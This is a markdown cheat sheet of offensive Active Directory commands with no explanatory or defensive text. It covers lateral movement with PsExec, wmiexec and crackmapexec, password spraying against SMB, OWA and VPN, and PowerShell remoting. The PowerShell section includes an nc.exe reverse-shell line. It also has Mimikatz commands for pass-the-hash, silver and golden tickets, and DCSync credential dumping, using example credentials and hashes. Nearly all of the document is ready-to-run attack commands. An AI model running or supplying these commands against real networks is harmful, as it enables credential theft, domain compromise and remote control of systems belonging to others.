### lateral movement
| for Example |
| -------------|
| PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd |
| psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig|
| psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t ipconfig |
| PsExec64.exe \\ninja.corp cmd |
| psexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
| wmiexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig |
| crackmapexec 192.168.100.1/24 |
| crackmapexec cme-hosts.txt --shares |
| cme-hosts.txt -u username.txt -p password.txt --shares |
|crackmapexec 192.168.100.10 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -p 'Passw0rd!' -x "net users" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -x "hostname" |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --sam            |
| crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 --lsa            |
| pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 |
| python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.100.10 #with hash |
| python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |

|  Password Spraying Attack |
| ------------- |
| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
|./atomizer.py owa contoso.com 'Fall2018' emails.txt|


| PowerShell Remoting |
| ------------------- |
|$Username = 'ninja.corp\MeMe' #powershell variable |
|$Password = '123456789aA'|
|$pass= ConvertTo-SecureString -AsPlainText $Password -Force #powershell variable |
|$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass #powershell variable |
|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}|
|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|





### Mimikatz 

| Pass-the-Hash  |
| ------------- |
|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|

|Silver Tickets  |
| ------------- |
|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:ninja.corp  /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|

|Golden Tickets |
| ------------- |
|Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:evil /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:MeMe /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|

|DCSync |
| ------------- |
|lsadump::dcsync /domain:pentestlab.local /all /csv|
|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|


Then use `mimikatz` to load the ticket.

### Mimikatz 
```powershell

mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
Get-DomainComputer -TrustedToAuth | select -exp dnshostname #Identify
```

